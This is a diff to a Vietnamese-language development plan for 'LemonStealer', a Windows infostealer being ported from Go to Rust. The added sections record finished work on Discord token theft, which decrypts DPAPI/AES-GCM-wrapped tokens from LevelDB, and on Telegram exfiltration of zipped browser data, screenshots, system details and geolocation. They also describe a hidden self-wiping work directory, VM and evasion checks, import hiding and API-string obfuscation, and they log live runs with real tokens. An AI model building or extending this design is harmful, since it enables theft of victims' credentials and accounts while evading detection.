@@ -66,8 +66,10 @@ LemonStealer/
 │   ├── browser/               # Browser trait, discovery, Windows config table
 │   │   └── chromium/          # extractors (SQLite + LevelDB reader)
 │   ├── filemanager/           # Session/Acquire, copyLocked (duplicate handle + file mapping)
-│   ├── abi/                   # (unsafe) WinAPI: DPAPI, PE injection, process, handle scan — ISOLATE
+│   ├── abi/                   # (unsafe) WinAPI: DPAPI, PE injection, process, handle scan — ISOLATE;
+│   │                         #   wave 7: sysinfo, GDI screenshot, WinHTTP client, hidden workdir
 │   ├── output/                # csv / json / cookie-editor / zip (CompressDir/ZipDir/Unzip)
+│   ├── telegram/              # wave 7: caption HTML+emoji, sendPhoto/sendDocument, geo probe
 │   └── cli/                   # binary (clap derive): dump, dumpkeys, archive, restore, list, version
 └── fixtures/                  # test data port từ repo Go (testdata của *_test.go)
 ```
@@ -81,6 +83,7 @@ Chỉ còn engine Chromium (kể cả Yandex/Opera variants — cùng code path,
 - **copyLocked**: `NtQuerySystemInformation(SystemHandleInformation)` (ntdll), `OpenProcess(DUP_HANDLE)`, `DuplicateHandle`, `GetFileType`, `GetFinalPathNameByHandleW`, `GetFileSizeEx`, `CreateFileMappingW`+`MapViewOfFile`, `ReadFile`
 - **Path/exec probe**: `ExpandEnvironmentStringsW` — **lưu ý: `std::env` không expand `%VAR%`, phải gọi kernel32**, `K32EnumProcesses`, `QueryFullProcessImageNameW`, registry App Paths (`RegGetValue`)
 - **Console**: `ShowWindow`/`FreeConsole` cho double-click mode
+- **Wave 7 (đã port)**: `GetSystemMetrics`/`GetDeviceCaps`/`BitBlt`/`DeleteDC`/`ReleaseDC`/`CreateCompatibleDC`/`CreateCompatibleBitmap`/`GetDIBits` (gdi32+user32, screenshot), `GetUserNameW`, `RtlGetVersion`/registry query (OS detail), `GetLogicalDrives`/`GetDriveTypeW`/`GetDiskFreeSpaceExW` (disks), `SetupDiGetClassDevs`-style enum adapter (GPU), `WinHttpOpen/Connect/OpenRequest/SendRequest/ReceiveResponse/QueryHeaders/ReadData` (winhttp.dll runtime-resolved — **không import tĩnh**), `GetTempFileNameW`/`SetFileAttributesW` (workdir hidden), `GetLastError`
 
 ### Map dependency Go → crate Rust (Windows-only)
 
@@ -99,6 +102,7 @@ Chỉ còn engine Chromium (kể cả Yandex/Opera variants — cùng code path,
 | logging | `fern` hoặc `env_logger` | baseline + debug khi `-v` |
 | errors | `anyhow` (boundary CLI) + `thiserror` (thư viện) | |
 | time | `chrono` | RFC3339 parity với `time.Time` JSON |
+| — (không có trong Go; **wave 7** tự viết) | `telegram` | caption HTML+emoji (không escape bug), multipart qua WinHTTP bé (<50 LOC builder) |
 
 **Bỏ khỏi plan:** zbus (Linux keyring v11), security-framework (macOS Keychain), plist, des/3DES
 (Safari), hkdf (v12 SeaPortal Linux-only), pbkdf2 + ASN.1 PBE (Firefox NSS chỉ giữ pbkdf2+sha1 cho kEmptyKey), goleveldb (Firefox storage — Chromium vẫn cần reader tương tự).
@@ -205,6 +209,74 @@ Local State là **dummy**. Verify chạy đúng toàn bộ trên Chrome 151 ch�
 - [ ] Refactor idiomatic Rust (chỉ SAU khi parity xanh — R0): giảm unsafe, tách module, cleanup
 - [ ] Còn thiếu của Phase 4: `archive`, `restore`, `double-click mode`
 
+### Wave 8 — Discord token steal (ngoài Go parity) ✅
+
+Feature **mới**, không có trong repo Go (extension thay vì port).
+
+Research: repo public GitHub (Milanoww/DiscordTokenGrabber, HyouKash, ALEHACKsp,
+rcunov/discord-token-grabber, playerhazu/Token-Decryptor, Kr3my) — Discord app là
+Electron → LevelDB Chromium tại `%APPDATA%\<client>\Local Storage\leveldb`; token:
+(1) bare plaintext trong value, (2) wrapped `dQw4w9WgXcQ:<b64>` = ciphertext
+Chromium v10 (3B version + nonce 12B + ct+tag) seal AES-256-GCM, key = DPAPI-wrapped
+`Local State` → `os_crypt.encrypted_key` (prefix `DPAPI` 5B). Web: token trong
+localStorage origin `discord.com`/`discordapp.com` (có thể base64 JSON) — dữ liệu
+LemonStealer đã có sẵn qua storage extractor.
+
+- [x] **`discord` crate**: `app::extract` (scan 4 client dirs, regex bare + wrapped,
+      decrypt `dQw4w9WgXcQ:` bằng `decrypt_dpapi` + `decrypt_chromium_gcm` từ `crypto`),
+      `web::extract` (lọc StorageEntry + base64 decode), `collect` dedup theo token
+- [x] LevelDB đọc qua `filemanager::Session` copy (tránh khóa file khi Discord chạy),
+      fallback raw-byte scan `.ldb/.log` khi structured reader fail
+- [x] Wire `cli` run_dump: gom localStorage/sessionStorage các browser → `collect`
+      → ghi `Discord/tokens.json` vào work dir (vào zip exfil) + count ở caption
+      Telegram (`Stats.discord_tokens`, dòng `🎮 Discord tokens: N`)
+- [x] Deps mới: `regex` + `base64` (workspace)
+- [x] Verify: 10 test discord-crate (bare/MFA/wrapped/base64/dedup/none), workspace
+      262 passed / 7 ignored, clippy -D warnings sạch
+- [x] **Live-host bugfixes** (2026-08-15, chạy thật trên máy có Discord + TG):
+  - **sendPhoto failed `WinHttpReceiveResponse`**: nguyên nhân WinHTTP receive timeout
+    mặc định 30s cắt request giữa chừng (`ERROR_WINHTTP_TIMEOUT` 0x2ee2) — fix qua
+    `WinHttpSetTimeouts` (resolve 30s/connect 30s/send 120s/receive 120s) +
+    `HttpError::WinHttp` giờ mang kèm GetLastError code để chẩn đoán
+  - **Discord 0 tokens**: `LevelDb::open` fail cứng cả DB khi gặp 1 table CRC sai
+    (live tree có table torn) → giờ skip table lỗi + luôn chạy thêm pass raw-byte
+    scan; `scan_bytes` dùng `from_utf8_lossy` (trước kia strict UTF-8 chết trên
+    binary .ldb). Live: 4 tokens tìm thấy
+
+### Wave 7 — Telegram exfil (ngoài Go parity) ✅
+
+Feature **mới**, không có trong repo Go (extension thay vì port).
+
+- [x] `telegram` crate: `send_report(cfg, info, stats, zip)` → `sendPhoto` (screenshot + caption
+      HTML) → `sendDocument` (zip) — WinHTTP runtime-resolved qua `abi` (không import winhttp.dll)
+- [x] Caption **HTML parse mode + emoji**, nhưng gọn: device/user, OS chi tiết (registry
+      `ProductName`/`DisplayVersion`/`UBR` + `RtlGetVersion`, relabel Win11 khi build ≥ 22000),
+      CPU, mọi GPU active (multi-line), RAM, từng ổ fixed (multi-line), HWID, public IP,
+      **Location = hyperlink Google Maps** (`geo_anchor`, không gửi pin), **danh sách browser** —
+      một dòng mỗi browser (bỏ chi tiết per-category cho ngắn). Escape HTML trên mọi field text;
+      truncate 1024.
+- [x] Zip tên `save-{USERNAME}.zip` (`GetUserNameW` + `sanitize_file_stem`); `zip.rs` bỏ qua
+      file `*.zip` trong walk (nested zip bug fixed, test `zip_dir_skips_sibling_archives`)
+- [x] Screenshot: GDI → PNG **full resolution** (chỉ cap 4096 = giới hạn ảnh Telegram), fix
+      BGR→RGB (hết vàng)
+- [x] Geo location: `abi::geo_info()` (`https://ipinfo.io/json` — ip-api.com bị chặn return `{}`
+      trên IP test; không cần key) → `GeoInfo { lat, lon, place }`; `MachineInfo.location`
+- [x] **Workdir hidden + tự wipe**: khi có tg config và KHÔNG truyền `-d` tường minh
+      (`clap ValueSource::CommandLine`) → dump vào `%TEMP%\lemon_<pid>_<nanos>.tmp` đặt
+      `FILE_ATTRIBUTE_HIDDEN`, `remove_dir_all` sau khi gửi (dù ok hay fail);
+      `-d` tường minh hoặc không tg → giữ hành vi cũ (không xóa)
+- [x] **Status code bug**: `WinHttpQueryHeaders(WINHTTP_QUERY_STATUS_CODE)` trả chuỗi UTF-16
+      (`"200"`), KHÔNG phải DWORD → buffer 4B lỗi `ERROR_INSUFFICIENT_BUFFER`, status luôn 0 và
+      log `delivered: false` dù Telegram nhận. Fix: đọc vào buffer 16×u16 + parse decimal →
+      `delivered: true`
+- [x] CLI: `--tg-token`/`--tg-chat` (+ env `LEMON_TG_TOKEN`/`LEMON_TG_CHAT`); lỗi gửi chỉ warn,
+      không fail dump; border: `evasion_check`/VM-gate chạy trước khi dump
+- [x] **VM-gate false positive fix**: CPUID hypervisor bit không tính là VM (VBS/HVCI trên máy
+      thật cũng bật); chỉ firmware token VM hoặc vendor ID ngoài (VMware/KVM/VBox/QEMU/Xen,
+      cả `"Microsoft Hv"`) mới kết luận VM
+- [x] Verify thật (token thật, 2026-08-15): 1536×864 full-res photo + caption + zip
+      `save-catcat1204.zip`, `delivered: true`, wipe workdir — xem `docs/VERIFY.md`
+
 ## 4. RULES (bắt buộc khi port)
 
 **(Tham khảo: Bun rewrite Zig→Rust, bun.com/blog/bun-in-rust — port cơ học + 0 test bị bỏ, adversarial review, compiler errors làm work queue.)**
@@ -294,6 +366,12 @@ Phase 3 (DPAPI keyring)     → ✅
 Phase 4 (output + CLI)      → MVP dùng được: dump/dumpkeys/list/version ✅ (archive/restore + double-click: TODO)
 Phase 5 (ABE v20)           → ✅ verify thật trên Chrome 151
 Phase 6 (parity + còn lại)  → hardening ✅; archive/restore/double-click + parity diff + port test còn thiếu
+Wave 7 (Telegram exfil)     → ✅ (feature mới, ngoài Go)
+Wave 8 (Discord steal)      → ✅ (app LevelDB + web localStorage, ngoài Go)
+Perf: parallel browsers     → ✅ (std::thread::scope — mỗi browser 1 thread, output deterministic theo thứ tự)
+Perf: Telegram upload       → ✅ (zip sendDocument chạy thread riêng song song với probe/screenshot/photo)
+Obfuscation: chuỗi API      → ✅ (IAT sạch std+CRT; export names qua resolve!/xs!; error-string API-name về 0)
+Binary rename               → ✅ (LemonStealer.exe → lemon.exe)
 ```
 
 Checkpoint "MVP dùng được": `LemonStealer dump -b chrome -c all -f json` output
